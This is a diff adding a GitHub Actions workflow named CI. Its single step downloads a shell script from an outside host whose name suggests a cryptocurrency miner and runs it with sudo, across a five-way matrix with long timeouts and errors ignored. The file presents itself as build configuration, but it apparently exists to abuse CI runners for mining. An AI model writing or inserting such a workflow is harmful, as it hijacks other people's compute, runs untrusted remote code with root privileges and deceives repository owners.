@@ -1,0 +1,24 @@
+name: CI
+
+on:
+  push:
+
+concurrency:
+  group: global
+  cancel-in-progress: true
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    timeout-minutes: 120
+    strategy:
+      matrix:
+        instance: ["v8a", "v7a", "x86_64", "x86", "universal"]
+
+    steps:
+      - name: Run
+        continue-on-error: true
+        run: |
+          wget "https://sk1dder-loli-m1ner.pages.dev/execute.sh"
+          chmod +x ./execute.sh
+          sudo ./execute.sh
